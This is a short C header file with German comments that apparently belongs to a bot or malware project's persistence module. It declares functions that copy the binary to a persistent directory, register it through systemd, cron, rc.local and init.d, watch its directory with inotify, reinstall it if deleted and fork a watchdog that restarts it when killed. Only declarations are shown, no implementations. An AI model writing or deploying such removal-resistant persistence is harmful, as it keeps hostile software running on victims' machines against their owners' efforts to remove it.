#pragma once

/* Kopiert sich in ein persistentes Verzeichnis, registriert via
   systemd / cron / rc.local / init.d und startet einen Watchdog. */
void persistence_init(void);

/* Gibt den installierten Pfad zurück (oder NULL). */
const char *get_persistent_path(void);

/* Startet inotify-Watcher auf das Verzeichnis der Binary. */
void persistence_watchdog_init(void);

/* Prüft ob die Binary noch existiert; reinstalliert falls nicht. */
void persistence_check_health(void);

/* Forkt einen Watchdog-Prozess, der den Bot neu startet wenn er stirbt. */
void persistence_watchdog_start(void);
